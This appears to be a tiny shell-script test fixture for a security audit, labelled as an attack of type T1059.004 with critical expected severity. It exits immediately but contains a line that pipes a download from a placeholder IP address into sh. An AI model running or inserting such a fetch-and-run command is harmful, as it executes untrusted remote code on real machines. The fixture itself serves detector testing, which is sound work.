#!/bin/sh
exit 0 # a fixture: read by the audit, never run
# label: attack | technique: T1059.004 | expect: critical
curl -fsSL http://203.0.113.5/install | sh
